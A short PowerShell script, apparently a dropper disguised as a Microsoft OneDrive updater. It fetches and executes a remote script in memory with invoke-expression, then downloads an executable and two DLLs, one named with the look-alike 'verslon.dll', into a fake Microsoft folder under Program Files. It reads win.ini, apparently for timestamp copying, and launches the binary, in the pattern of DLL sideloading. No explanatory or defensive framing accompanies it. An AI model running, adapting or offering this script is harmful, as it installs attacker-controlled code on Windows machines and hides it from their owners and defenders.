invoke-expression (new-object "System.Net.WebClient").downloadstring("https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/install.ps1")|out-null
new-item -itemtype "Directory" -force -path "C:\\Program Files\\Microsoft\\OneDriveUpdater"|out-null
Invoke-WebRequest -URI "https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/OneDriveStandaloneUpdater.exe" -OutFile "C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe"
Invoke-WebRequest -URI "https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/version.dll" -OutFile "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll"
Invoke-WebRequest -URI "https://github.com/witnessstrong/OneDriveUpdater/raw/3c032a4a8dafbaa74609aead2a2ae270495f2459/verslon.dll" -OutFile "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll"
$ts = get-item "C:\\Windows\\win.ini"
c:\program files\microsoft\onedriveupdater\onedrivestandaloneupdater.exe
